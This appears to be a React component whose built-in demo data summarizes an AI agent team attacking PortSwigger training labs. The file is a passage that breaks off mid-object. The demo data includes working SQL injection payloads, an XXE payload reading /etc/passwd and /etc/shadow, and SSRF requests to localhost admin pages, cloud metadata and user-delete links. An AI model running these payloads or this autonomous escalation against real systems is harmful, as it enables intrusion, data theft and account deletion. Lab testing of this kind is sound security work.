'use client';

import { useEffect, useRef, useState } from 'react';
import { cn } from '@/lib/utils';
import { gsap } from 'gsap';
import { ScrollTrigger } from 'gsap/ScrollTrigger';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Terminal, Shield, Brain, Code, BarChart, BookOpen } from 'lucide-react';

interface AgentMessage {
  agent: string;
  message: string;
  isSystem?: boolean;
}

interface CardData {
  title: string;
  content: string;
  messages: AgentMessage[];
}

interface AnimatedHorizontalCardsProps {
  cards?: CardData[];
  className?: string;
}




const AGENT_ICONS: Record<string, React.ElementType> = {
  security_teacher: Shield,
  attack_analysis_agent: Brain,
  code_writer_agent: Code,
  code_executor_agent: Terminal,
  exploit_writer_agent: Code,
  exploit_executor_agent: Terminal,
  result_analyzer_agent: BarChart,
  knowledge_assistant: BookOpen,
};

export function AnimatedHorizontalCards({
  cards = [
    {
      title: 'SQL Injection in PortSwigger Lab',
      content: 'Our agent automatically discovers and tests for SQL injection vulnerabilities.',
      messages: [
        {
            "agent": "attack_analysis_agent",
            "message": "Requesting analysis of the SQL injection attack vector targeting the `category` parameter. Proposing to check for existing tools first, then potentially use custom scripts. Outlining the plan: 1. Check tools. 2. Use custom scripts if needed. 3. Build strategy. 4. Document findings."
        },
        {
            "agent": "knowledge_assistant",
            "message": "Recommends using **SQLMap** for testing the SQL injection vulnerability on the `category` parameter. Provides basic and advanced usage examples:\n\n*   **Basic Test**: `sqlmap -u \"https://.../filter?category=Accessories\"`\n*   **Target Parameter**: `sqlmap -u \"https://.../filter\" -p category`\n*   **Advanced**: Use `--dbs` for enumeration, `--dump` for data extraction.\n\nMentions advantages (automation) and limitations (WAFs). Suggests attack strategy: SQLMap first, fall back to custom Python script if needed. Includes an example Python script using `requests` and basic payloads (`' UNION SELECT NULL--`, `' OR '1'='1`). Advises documenting all steps and results."
        },
        {
            "agent": "attack_analysis_agent",
            "message": "Decided to use SQLMap first to test the SQL injection vulnerability. If SQLMap fails or isn't suitable, will switch to custom Python scripts."
        },
        {
            "agent": "exploit_executor_agent",
            "message": "SQLMap execution output:\n```\nexitcode: 2 (execution failed)\n[...] \n[18:14:58] [INFO] GET parameter 'category' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable...\n[18:15:15] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'PostgreSQL'\n[...] \n[18:15:31] [INFO] GET parameter 'category' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable \n[18:15:43] [INFO] GET parameter 'category' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable \n[18:15:48] [INFO] target URL appears to have 8 columns in query\n[18:15:51] [INFO] GET parameter 'category' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nsqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:\n---\nParameter: category (GET)\n    Type: boolean-based blind\n    Type: stacked queries\n    Type: time-based blind\n    Type: UNION query\n---\n[18:15:52] [INFO] the back-end DBMS is PostgreSQL\nback-end DBMS: PostgreSQL\n[18:15:58] [WARNING] HTTP error codes detected during run:\n500 (Internal Server Error) - 35 times\n[...] (Further SQLMap runs show errors/failures likely due to incorrect parameters or targets)\n```\n**Summary**: SQLMap successfully identified the backend as PostgreSQL and confirmed the `category` parameter is vulnerable to multiple SQL injection types: boolean-based blind, stacked queries, time-based blind, and UNION query (8 columns detected). Many HTTP 500 errors were observed during testing."
        },
        {
            "agent": "result_analyzer_agent",
            "message": "Attack Result: {\n    \"success\": true,\n    \"findings\": [\n        {\n            \"type\": \"SQL Injection\",\n            \"description\": \"The 'category' parameter is vulnerable to boolean-based blind, stacked queries, time-based blind, and UNION query SQL injection.\",\n            \"severity\": \"high\"\n        },\n        {\n            \"type\": \"Database Information Disclosure\",\n            \"description\": \"The back-end DBMS was identified as PostgreSQL.\",\n            \"severity\": \"medium\"\n        }\n    ],\n    \"discovered_params\": [\"category\"],\n    \"vulnerabilities\": [\"boolean-based blind SQL injection\", \"stacked queries SQL injection\", \"time-based blind SQL injection\", \"UNION query SQL injection\"]\n}"
        },
        {
            "agent": "attack_analysis_agent",
            "message": "SQLMap confirmed the `category` parameter is vulnerable to multiple SQL injection types on a PostgreSQL backend. Next step is to attempt further exploitation using SQLMap to enumerate the database and extract data."
        },
        {
            "agent": "exploit_executor_agent",
            "message": "(Empty output or execution failure) - The subsequent SQLMap command for exploitation likely failed due to environment setup or incorrect command arguments."
        },
        {
            "agent": "exploit_writer_agent",
            "message": "Since direct SQLMap exploitation failed (possibly environment issues), switching to a custom Python script. Plan: Use UNION query (knowing 8 columns) and stacked queries manually."
        },
        {
            "agent": "exploit_writer_agent",
            "message": "Provided custom Python script using `requests`:\n```python\nimport requests\n\nbase_url = \"https://0a3000ba046e16dd8033081b00850039.web-security-academy.net/filter?category=\"\npayloads = [\n    \"Accessories' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--\", # Confirm 8 columns\n    \"Accessories' UNION ALL SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--\", # Enumerate tables\n    \"Accessories'; SELECT PG_SLEEP(5)--\" # Stacked query (time-based)\n]\nheaders = { ... }\n\nfor payload in payloads:\n    # ... send request, check response/timeout ...\n```\nExplanation: Script tests UNION (column count, table enum) and stacked query (time delay)."
        },
        {
            "agent": "exploit_executor_agent",
            "message": "Custom script execution output:\n```\nexitcode: 0 (execution succeeded)\nCode output: Testing payload: Accessories' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--\nPayload successful (Status 200): ...\nResponse (first 500 chars): <!DOCTYPE html>...\nTesting payload: Accessories' UNION ALL SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--\nPayload failed with status code: 500\nTesting payload: Accessories'; SELECT PG_SLEEP(5)--\nPayload failed with status code: 500\n```\n**Summary**: UNION query confirming 8 columns succeeded (HTTP 200). UNION query for table enumeration and the stacked query (PG_SLEEP) both failed (HTTP 500)."
        },
        {
            "agent": "result_analyzer_agent",
            "message": "Attack Result: {\n    \"success\": \"partial\",\n    \"findings\": [\n        {\n            \"type\": \"SQL Injection\",\n            \"description\": \"UNION query confirmed 8 columns.\",\n            \"severity\": \"medium\"\n        },\n        {\n            \"type\": \"SQL Injection Attempt\",\n            \"description\": \"UNION query table enumeration and stacked query execution failed (HTTP 500 errors), suggesting filtering/blocking.\",\n            \"severity\": \"low\"\n        }\n    ],\n    \"vulnerabilities\": [\"UNION query SQL injection (column count confirmation)\"],\n    \"failed_attempts\": [\"table enumeration via UNION query\", \"stacked queries for time-based blind SQL injection\"]\n}"
        },
        {
            "agent": "security_teacher",
            "message": "Analysis: UNION confirmed column count, but further exploitation (enumeration, stacked queries) failed with HTTP 500s. Recommendations: Refine UNION payloads (try casting data types, focus on specific columns), attempt error-based injection, or use basic tampering techniques."
        },
        {
            "agent": "attack_analysis_agent",
            "message": "Acknowledging partial success and failures. Refining plan based on feedback: will try refined UNION payloads, attempt error-based injection, and consider tampering."
        },
        {
            "agent": "exploit_writer_agent",
            "message": "Provided refined Python script:\n```python\nimport requests\n\nbase_url = \"https://...\"\nrefined_payloads = [\n    # UNION: Enumerate tables in 'public' schema\n    \"Accessories' UNION ALL SELECT table_name,NULL,... FROM information_schema.tables WHERE table_schema='public'--\",\n    # Error-based: Check table count\n    \"Accessories' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--\",\n    # UNION: Enumerate columns from 'users' table\n    \"Accessories' UNION ALL SELECT column_name,NULL,... FROM information_schema.columns WHERE table_name='users'--\"\n]\nheaders = { ... }\n\n# ... send requests, check responses ...\n```\nExplanation: Tests refined UNION (tables in `public`, columns in `users`) and an error-based payload."
        },
        {
            "agent": "exploit_executor_agent",
            "message": "Refined script execution output:\n```\nexitcode: 0 (execution succeeded)\nCode output: Testing refined payload: Accessories' UNION ALL SELECT table_name,...--\nPayload failed with status code: 500\nTesting refined payload: Accessories' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--\nPayload potentially successful (Status 200): ...\nResponse (first 500 chars): <!DOCTYPE html>...\nTesting refined payload: Accessories' UNION ALL SELECT column_name,...--\nPayload failed with status code: 500\n```\n**Summary**: UNION payloads still failed (HTTP 500). The error-based payload (`AND 1=(SELECT COUNT(*)...)`) returned HTTP 200, indicating it executed without breaking the application."
        },
        {
            "agent": "result_analyzer_agent",
            "message": "Attack Result: {\n    \"success\": \"partial\",\n    \"findings\": [\n        {\n            \"type\": \"SQL Injection\",\n            \"description\": \"Error-based SQL injection payload executed successfully (HTTP 200), confirming this technique is viable.\",\n            \"severity\": \"medium\"\n        },\n        {\n            \"type\": \"SQL Injection Attempt\",\n            \"description\": \"UNION query enumeration attempts still fail (HTTP 500), indicating robust filtering.\",\n            \"severity\": \"low\"\n        }\n    ],\n    \"vulnerabilities\": [\"error-based SQL injection (conditional execution confirmed)\"],\n    \"failed_attempts\": [\"table enumeration via UNION query\", \"column enumeration via UNION query\"]\n}"
        },
        {
            "agent": "attack_analysis_agent",
            "message": "Error-based SQLi confirmed possible, while UNION enumeration remains blocked. Next step: Focus on error-based injection using iterative techniques (LIMIT/OFFSET) to extract information."
        },
        {
            "agent": "exploit_writer_agent",
            "message": "Planning to use iterative error-based SQL injection. Payloads will use `LIMIT 1 OFFSET n` combined with conditional checks (e.g., `... )='table_name'--`) to identify specific table/column names at each offset based on the server's response (expecting HTTP 200 on true condition). Will write a script to automate this."
        },
        {
            "agent": "exploit_writer_agent",
            "message": "Provided Python script for iterative error-based extraction:\n```python\nimport requests\n\nbase_url = \"https://...\"\nheaders = { ... }\n\ndef extract_table_names():\n    for offset in range(0, 10):\n        # Check if table at offset is 'users'\n        payload = f\"Accessories' AND (SELECT table_name FROM ... LIMIT 1 OFFSET {offset})='users'--\"\n        # ... send request, check for HTTP 200 ...\n\ndef extract_column_names(table_name):\n    for offset in range(0, 10):\n        # Check if column at offset is 'username'\n        payload = f\"Accessories' AND (SELECT column_name FROM ... LIMIT 1 OFFSET {offset})='username'--\"\n        # ... send request, check for HTTP 200 ...\n\nextract_table_names()\nextract_column_names(\"users\")\n```\nExplanation: Iterates offsets 0-9, checking if the table name is 'users' and column name is 'username' via conditional payloads. HTTP 200 implies the condition was met."
        },
        {
            "agent": "exploit_executor_agent",
            "message": "Iterative script execution output:\n```\nexitcode: 0 (execution succeeded)\nCode output: Checking for 'users' table at offsets 0-9...\nConfirmed 'users' table likely exists at offset 0.\nConfirmed 'users' table likely exists at offset 1.\n...\nConfirmed 'users' table likely exists at offset 9.\nChecking for 'username' column in table 'users' at offsets 0-9...\nConfirmed 'username' column likely exists at offset 0.\nConfirmed 'username' column likely exists at offset 1.\n...\nConfirmed 'username' column likely exists at offset 9.\n```\n**Summary**: Script consistently returned HTTP 200 for checks against 'users' and 'username' across all tested offsets (0-9), indicating the iteration logic is flawed and not isolating unique items per offset."
        },
        {
            "agent": "result_analyzer_agent",
            "message": "Attack Result: {\n    \"success\": \"partial\",\n    \"findings\": [\n        {\n            \"type\": \"SQL Injection\",\n            \"description\": \"Error-based SQLi confirmed 'users' table and 'username' column exist.\",\n            \"severity\": \"medium\"\n        },\n        {\n            \"type\": \"Potential Enumeration Issue\",\n            \"description\": \"Repetitive positive results across offsets suggest flawed payload/logic; unique enumeration failed.\",\n            \"severity\": \"low\"\n        }\n    ],\n    \"vulnerabilities\": [\"error-based SQL injection (conditional confirmation)\"],\n    \"failed_attempts\": [\"accurate enumeration of unique table and column names via iterative error-based checks\"]\n}"
        },
        {
            "agent": "security_teacher",
            "message": "Analysis: Confirmed `users` table and `username` column, but iterative error-based checks failed to enumerate uniquely due to flawed logic. Recommendations: Try Blind SQLi for proper enumeration, attempt UNION extraction again now targeting `users.username`, or simplify the UNION payload."
        },
        {
            "agent": "attack_analysis_agent",
            "message": "Acknowledging flawed enumeration. Plan: Attempt error-based check again using `DISTINCT` and focus main effort on extracting data from `users.username` using UNION query with iteration."
        },
        {
            "agent": "exploit_writer_agent",
            "message": "Provided final Python script:\n```python\nimport requests\n\nbase_url = \"https://...\"\nheaders = { ... }\n\ndef check_distinct_table_names():\n    for offset in range(0, 10):\n        # Error-based check with DISTINCT\n        payload = f\"Accessories' AND (SELECT DISTINCT table_name ... LIMIT 1 OFFSET {offset})='users'--\"\n        # ... send request, check for HTTP 200 ...\n\ndef extract_sensitive_data():\n    for offset in range(0, 10):\n        # Attempt UNION extraction of username\n        payload = f\"Accessories' UNION ALL SELECT username,NULL,... FROM users LIMIT 1 OFFSET {offset}--\"\n        # ... send request, check response (expecting 500 if blocked) ...\n\ncheck_distinct_table_names()\nextract_sensitive_data()\n```\nExplanation: Tries error-based check with `DISTINCT`. Main focus is UNION query to extract `username` from `users` table iteratively."
        },
        {
            "agent": "exploit_executor_agent",
            "message": "Final script execution output:\n```\nexitcode: 0 (execution succeeded)\nCode output: Checking for 'users' table using DISTINCT at offsets 0-9...\nConfirmed 'users' table likely exists at offset 0 (DISTINCT check).\n...\nConfirmed 'users' table likely exists at offset 9 (DISTINCT check).\nAttempting to extract usernames from 'users' table via UNION...\nUNION query failed at offset 0. Status code: 500\n...\nUNION query failed at offset 9. Status code: 500\n```\n**Summary**: Error-based check with `DISTINCT` still produced repetitive results. UNION query attempts to extract `username` failed consistently with HTTP 500 errors."
        },
        {
            "agent": "result_analyzer_agent",
            "message": "Attack Result: {\n    \"success\": false,\n    \"findings\": [\n        {\n            \"type\": \"SQL Injection Confirmation\",\n            \"description\": \"Error-based SQLi confirms 'users' table exists; DISTINCT didn't fix flawed enumeration.\",\n            \"severity\": \"medium\"\n        },\n        {\n            \"type\": \"SQL Injection Attempt Failure\",\n            \"description\": \"UNION query data extraction from 'users' table failed consistently (HTTP 500), indicating it's blocked.\",\n            \"severity\": \"low\"\n        }\n    ],\n    \"vulnerabilities\": [\"error-based SQL injection (conditional confirmation)\"],\n    \"failed_attempts\": [\"accurate enumeration of unique table names (error-based)\", \"data extraction from 'users' table via UNION query\"]\n}"
        },
        {
            "agent": "attack_analysis_agent",
            "message": "Final assessment: Error-based SQLi confirmed 'users' table but enumeration logic remains flawed. UNION query for data extraction is consistently blocked (HTTP 500). Reliable enumeration and data exfiltration failed with current methods. Concluding no further progress possible with this approach. **TERMINATE**."
        }
    ]
       
      
      
    },
    {
      title: 'XXE in PortSwigger Lab',
      content: 'Our agent automatically discovers and tests for XML External Entity (XXE) injection vulnerabilities.',
      messages: [
        {
            "agent": "attack_analysis_agent",
            "message": "Analyzing XXE attack vector for XML stock check. Requesting tool info first. Plan: Check tools, use custom scripts if needed, build strategy, document."
        },
        {
            "agent": "knowledge_assistant",
            "message": "Recommends **Burp Suite** or **OWASP ZAP** for testing XXE. Provides example XXE payload (`<!ENTITY xxe SYSTEM \"file:///etc/passwd\">`) and usage steps. Suggests falling back to **custom Python scripts** (provides example using `requests`) if tools are insufficient or flexibility is needed. Mentions SSRF testing by targeting internal/external URLs. Advises starting with tools and documenting results."
        },
        {
            "agent": "attack_analysis_agent",
            "message": "Plan: Use Burp Suite/ZAP first for XXE testing with the provided payload. If needed, switch to a custom Python script. If successful, escalate to other files or SSRF. Will proceed with tools unless asked to use script directly."
        },
        {
            "agent": "exploit_writer_agent",
            "message": "Switching to a custom Python script due to environment limitations. Provided script using `requests` to POST the XXE payload (`file:///etc/passwd`) and check the response for 'root:x:'.\n```python\nimport requests\n\nmalicious_payload = \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>\"\"\"\nurl = \"https://0ae60069030190ab83a1f638002900c3.web-security-academy.net/product/stock\"\nheaders = {\"Content-Type\": \"application/xml\", ...}\n\nresponse = requests.post(url, data=malicious_payload, headers=headers)\n\nif response.status_code == 200 and \"root:x:\" in response.text:\n    print(\"[!] XXE vulnerability confirmed!...\")\nelse:\n    print(\"[-] Test failed...\")\n```\nNext: Execute script, analyze results, escalate if successful."
        },
        {
            "agent": "exploit_executor_agent",
            "message": "XXE script execution output:\n```\nexitcode: 0 (execution succeeded)\nCode output: [*] Sending XXE payload to the target...\n[-] Server responded with status 400. The payload may not have been processed.\nResponse content:\n\"Invalid product ID: root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:...\\npeter:x:12001:12001::/home/peter:/bin/bash\\n...\"\n```\n**Summary**: Server responded with HTTP 400, but the error message unexpectedly contained the content of `/etc/passwd`, confirming XXE vulnerability."
        },
        {
            "agent": "result_analyzer_agent",
            "message": "Attack Result: {\n    \"success\": true,\n    \"findings\": [\n        {\n            \"type\": \"XXE vulnerability\",\n            \"description\": \"Server processed the XXE payload and returned '/etc/passwd' content within a 400 error message, confirming XXE.\",\n            \"severity\": \"high\"\n        }\n    ],\n    \"discovered_params\": [\"productId\", \"storeId\"],\n    \"vulnerabilities\": [\"XXE vulnerability\"]\n}"
        },
        {
            "agent": "attack_analysis_agent",
            "message": "XXE attack successful! `/etc/passwd` content retrieved via the vulnerability. Key findings: High severity XXE vulnerability confirmed. Next steps: Escalate by trying to access other files (e.g., `/etc/shadow`) and testing for SSRF using internal/external URLs."
        },
        {
            "agent": "exploit_writer_agent",
            "message": "Proceeding with escalation. Plan: Test payloads for `/etc/shadow` access and SSRF (internal: `http://127.0.0.1/admin`, external: `http://example.com`). Will embed these in a Python script for execution."
        },
        {
            "agent": "exploit_executor_agent",
            "message": "Payload execution attempt failed:\n```\nexitcode: 1 (execution failed)\nCode output: Unsupported language xml\n```\n**Summary**: Execution failed because the raw XML payloads were likely passed instead of a script to send them."
        },
        {
            "agent": "attack_analysis_agent",
            "message": "Correcting execution approach. Provided Python script to test the escalation payloads:\n```python\nimport requests\n\nurl = \"https://...\"\nheaders = { ... }\npayloads = {\n    \"Access /etc/shadow\": \"\"\"<?xml ... <!ENTITY xxe SYSTEM \\\"file:///etc/shadow\\\"> ... &xxe; ...\"\"\",\n    \"Test SSRF with Internal URL\": \"\"\"<?xml ... <!ENTITY xxe SYSTEM \\\"http://127.0.0.1/admin\\\"> ... &xxe; ...\"\"\",\n    \"Test SSRF with External URL\": \"\"\"<?xml ... <!ENTITY xxe SYSTEM \\\"http://example.com\\\"> ... &xxe; ...\"\"\"\n}\n\nfor description, payload in payloads.items():\n    print(f\"[*] Testing: {description}\")\n    response = requests.post(url, data=payload, headers=headers)\n    # ... print response status and content ...\n```\nNext: Execute this script."
        },
        {
            "agent": "exploit_executor_agent",
            "message": "Escalation script execution output:\n```\nexitcode: 0 (execution succeeded)\nCode output: [*] Testing: Access /etc/shadow\nStatus Code: 400\nResponse Content: \"XML parser exited with error: java.io.FileNotFoundException: /etc/shadow (Permission denied)\"\n--------------------------------------------------\n[*] Testing: Test SSRF with Internal URL\nStatus Code: 400\nResponse Content: \"XML parser exited with error: java.net.ConnectException: Connection refused\"\n--------------------------------------------------\n[*] Testing: Test SSRF with External URL\nStatus Code: 400\nResponse Content: \"XML parser exited with error: java.net.UnknownHostException: example.com\"\n--------------------------------------------------\n```\n**Summary**: Access to `/etc/shadow` denied by permissions. SSRF attempt to internal URL refused connection. SSRF attempt to external URL failed hostname resolution."
        },
        {
            "agent": "result_analyzer_agent",
            "message": "Attack Result: {\n    \"success\": \"partial\",\n    \"findings\": [\n        {\n            \"type\": \"XXE vulnerability\",\n            \"description\": \"XXE confirmed, but access to '/etc/shadow' denied by file permissions.\",\n            \"severity\": \"medium\"\n        },\n        {\n            \"type\": \"SSRF vulnerability\",\n            \"description\": \"Server attempted internal connection ('Connection refused'), confirming SSRF capability.\",\n            \"severity\": \"medium\"\n        },\n        {\n            \"type\": \"SSRF vulnerability\",\n            \"description\": \"Server attempted external connection ('UnknownHostException'), suggesting outbound DNS/network restrictions.\",\n            \"severity\": \"low\"\n        }\n    ],\n    \"vulnerabilities\": [\"XXE vulnerability\", \"SSRF vulnerability\"]\n}"
        },
        {
            "agent": "security_teacher",
            "message": "Analysis: XXE confirmed but limited by file permissions. SSRF confirmed as server attempted connections, but limited by target service availability (internal) and network/DNS restrictions (external). Recommendations: Test XXE with other file paths (logs, /tmp), try SSRF with different internal/external targets, refine payloads (encoding, other protocols like ftp/gopher), explore other parameters/endpoints."
        },
        {
            "agent": "attack_analysis_agent",
            "message": "XXE and SSRF confirmed but exploitation limited by permissions and network restrictions. No further viable paths identified with current findings. **TERMINATE**."
        }
    ]
      
      
    },
    {
      title: 'SSRF in PortSwigger Lab',
      content: 'Our agent automatically discovers and tests for Server-Side Request Forgery (SSRF) vulnerabilities.',
      messages: [
        {
            "agent": "attack_analysis_agent",
            "message": "Analyzing Attack Vector ID 8: Test the `stockApi` parameter in POST /product/stock for SSRF vulnerabilities using internal URLs like http://localhost/admin, http://127.0.0.1:80/admin, http://169.254.169.254/latest/meta-data/, etc. Asking knowledge_assistant for relevant tool information before deciding on using existing tools or custom scripts. Provided Network Traffic Details for the POST request to https://0a1700bf03f992ba82c9b0e500c90085.web-security-academy.net/product/stock."
        },
        {
            "agent": "knowledge_assistant",
            "message": "Suggests using Burp Suite or custom Python scripts for testing SSRF in the `stockApi` parameter.\n\n**Existing Tools:**\n1.  **Burp Suite:** Intercept request, modify `stockApi` with payloads like `http://localhost/admin`, `http://127.0.0.1:80/admin`, `http://169.254.169.254/latest/meta-data/`, `http://localhost:8080/`, and observe responses.\n2.  **SSRF-specific Scripts:** Use automated scripts or payload lists (e.g., SecLists).\n\n**Custom Scripts:** Example Python script provided for testing:\n```python\nimport requests\n\n# Define target URL and payloads\nurl = \"https://0a1700bf03f992ba82c9b0e500c90085.web-security-academy.net/product/stock\"\npayloads = [\n    \"http://localhost/admin\",\n    \"http://127.0.0.1:80/admin\",\n    \"http://169.254.169.254/latest/meta-data/\",\n    \"http://localhost:8080/\"\n]\n\n# Iterate through payloads\nfor payload in payloads:\n    data = {\"stockApi\": payload}\n    headers = {\n        \"Content-Type\": \"application/x-www-form-urlencoded\",\n        \"Referer\": \"https://0a1700bf03f992ba82c9b0e500c90085.web-security-academy.net/product?productId=1\"\n    }\n    response = requests.post(url, data=data, headers=headers)\n    print(f\"Payload: {payload}, Status Code: {response.status_code}, Response: {response.text}\")\n```\n\n**Pros/Cons & Recommendations:**\n*   Burp Suite is user-friendly but may require Pro for automation.\n*   Custom scripts offer flexibility but require coding.\nRecommend starting with Burp Suite if familiar, otherwise use custom scripts for extensive testing."
        },
        {
            "agent": "attack_analysis_agent",
            "message": "Based on the info and need for automation on Windows, decided to use a custom Python script to test the `stockApi` parameter in POST `https://0a1700bf03f992ba82c9b0e500c90085.web-security-academy.net/product/stock` for SSRF vulnerabilities. Will test payloads like `http://localhost/admin`, `http://127.0.0.1:80/admin`, and `http://169.254.169.254/latest/meta-data/`. Will analyze responses for success (e.g., 200 status, sensitive data) and escalate if needed. Instructing code writer agent."
        },
        {
            "agent": "code_writer_agent",
            "message": "Here is the Python script to test the `stockApi` parameter for SSRF vulnerabilities:\n\n```python\nimport requests\n\n# Target URL\nurl = \"https://0a1700bf03f992ba82c9b0e500c90085.web-security-academy.net/product/stock\"\n\n# List of SSRF payloads\npayloads = [\n    \"http://localhost/admin\",\n    \"http://127.0.0.1:80/admin\",\n    \"http://169.254.169.254/latest/meta-data/\",\n    \"http://localhost:8080/\"\n]\n\n# Headers for the request\nheaders = {\n    \"Content-Type\": \"application/x-www-form-urlencoded\",\n    \"Referer\": \"https://0a1700bf03f992ba82c9b0e500c90085.web-security-academy.net/product?productId=1\",\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\"\n}\n\n# Iterate through each payload and send the request\nfor payload in payloads:\n    data = {\"stockApi\": payload}\n    try:\n        response = requests.post(url, data=data, headers=headers, timeout=10)\n        print(f\"Testing payload: {payload}\")\n        print(f\"Status Code: {response.status_code}\")\n        print(f\"Response Body: {response.text}\\n\")\n        \n        # Escalate if a 200 status code is received\n        if response.status_code == 200:\n            print(f\"Potential SSRF detected with payload: {payload}\")\n            print(\"Escalating further testing...\\n\")\n            # Additional escalation logic can be added here\n    except requests.exceptions.RequestException as e:\n        print(f\"Error testing payload {payload}: {e}\\n\")\n```\n\n**Script Explanation:**\n*   Tests common SSRF payloads targeting internal services.\n*   Modifies `stockApi` parameter and mimics browser headers.\n*   Checks status code and response body for SSRF indicators (e.g., 200 OK).\n*   Includes basic error handling.\n\n**Next Steps:** Run the script and analyze the output. Escalate if 200 status is received."
        },
        {
            "agent": "code_executor_agent",
            "message": "Code execution succeeded (exitcode 0).\n**Output:**\n*   Testing payload: `http://localhost/admin` -> Status Code: 200. Response Body: HTML of the admin panel, showing 'Users' heading and delete links for 'wiener' and 'carlos'. Potential SSRF detected.\n*   Testing payload: `http://127.0.0.1:80/admin` -> Status Code: 200. Response Body: Same HTML admin panel. Potential SSRF detected.\n*   Testing payload: `http://169.254.169.254/latest/meta-data/` -> Status Code: 500. Response Body: HTML showing 'Internal Server Error - Could not connect to external stock check service'.\n*   Testing payload: `http://localhost:8080/` -> Status Code: 500. Response Body: HTML showing 'Internal Server Error - Could not connect to external stock check service'."
        },
        {
            "agent": "attack_analysis_agent",
            "message": "Execution results indicate `stockApi` is vulnerable to SSRF.\n*   Payloads `http://localhost/admin` and `http://127.0.0.1:80/admin` returned 200 OK with the `/admin` page content, revealing user delete links.\n*   Payloads for AWS metadata (`http://169.254.169.254/...`) and `http://localhost:8080/` returned 500 errors.\n\n**Next Steps:**\n1.  Escalate by focusing on the accessible `/admin` page.\n2.  Test if the delete links (`/admin/delete?username=wiener`, `/admin/delete?username=carlos`) can be triggered via SSRF.\n3.  Craft new payloads like `http://localhost/admin/delete?username=wiener`.\n4.  Analyze the response to see if the delete action is executed.\nProceeding to craft and test these new payloads."
        },
        {
            "agent": "code_writer_agent",
            "message": "Here is the Python script to test the `/admin/delete` links via SSRF:\n\n```python\nimport requests\n\n# Target URL\nurl = \"https://0a1700bf03f992ba82c9b0e500c90085.web-security-academy.net/product/stock\"\n\n# SSRF payloads targeting the delete links\npayloads = [\n    \"http://localhost/admin/delete?username=wiener\",\n    \"http://localhost/admin/delete?username=carlos\"\n]\n\n# Headers for the request\nheaders = {\n    \"Content-Type\": \"application/x-www-form-urlencoded\",\n    \"Referer\": \"https://0a1700bf03f992ba82c9b0e500c90085.web-security-academy.net/product?productId=1\",\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\"\n}\n\n# Iterate through each payload and send the request\nfor payload in payloads:\n    data = {\"stockApi\": payload}\n    try:\n        response = requests.post(url, data=data, headers=headers, timeout=10)\n        print(f\"Testing payload: {payload}\")\n        print(f\"Status Code: {response.status_code}\")\n        print(f\"Response Body: {response.text}\\n\")\n        \n        # Check if the delete action was successful\n        if response.status_code == 200 and \"User deleted\" in response.text:\n            print(f\"Successfully deleted user with payload: {payload}\\n\")\n        else:\n            print(f\"Delete action failed or not confirmed for payload: {payload}\\n\")\n    except requests.exceptions.RequestException as e:\n        print(f\"Error testing payload {payload}: {e}\\n\")\n```\n\n**Script Explanation:**\n*   Tests SSRF payloads targeting `/admin/delete` links for users `wiener` and `carlos`.\n*   Checks response for confirmation of delete action (e.g., \"User deleted\").\n*   Includes basic error handling.\n\n**Next Steps:** Run the script and analyze the output to confirm impact."
        },
        {
            "agent": "code_executor_agent",
            "message": "Code execution succeeded (exitcode 0).\n**Output:**\n*   Testing payload: `http://localhost/admin/delete?username=wiener` -> Status Code: 401. Response Body: HTML indicating 'Admin interface only available if logged in as an administrator, or if requested from loopback'. Delete action failed.\n*   Testing payload: `http://localhost/admin/delete?username=carlos` -> Status Code: 401. Response Body: Similar HTML indicating access restriction, but also includes 'Congratulations, you solved the lab!' banner. Delete action failed."
        },
        {
            "agent": "result_analyzer_agent",
            "message": "Attack Result: {\n    \"success\": true,\n    \"findings\": [\n        {\n            \"type\": \"SSRF vulnerability\",\n            \"description\": \"The `stockApi` parameter in the POST request body is vulnerable to SSRF. The server fetched and returned content from internal resources such as `http://localhost/admin` and `http://127.0.0.1:80/admin`. This includes sensitive administrative data.\",\n            \"severity\": \"high\"\n        },\n        {\n            \"type\": \"Access control issue\",\n            \"description\": \"The `/admin` page was accessible via SSRF, exposing administrative functionalities such as user deletion links. However, attempts to trigger these links (`/admin/delete?username=...`) via SSRF resulted in a 401 Unauthorized response, indicating partial protection.\",\n            \"severity\": \"medium\"\n        }\n    ],\n    \"discovered_params\": [\"stockApi\"],\n    \"vulnerabilities\": [\"SSRF\", \"Access control issue\"]\n}"
        },
        {
            "agent": "security_teacher",
            "message": "Analysis confirms `stockApi` is vulnerable to SSRF, allowing access to internal resources like the `/admin` page. Attempts to exploit admin actions (user deletion via `/admin/delete?username=...`) through SSRF failed with a 401 Unauthorized due to access controls.\n\n**Key Findings:**\n1.  **SSRF Vulnerability:** Server fetched internal `/admin` content via `stockApi`, exposing admin data/links.\n2.  **Access Control Issue:** `/admin` page accessible via SSRF, but actions like deletion are restricted (require admin login or loopback).\n\n**Next Steps:** Further SSRF exploration could test other internal endpoints or attempt access control bypasses."
        },
        {
            "agent": "attack_analysis_agent",
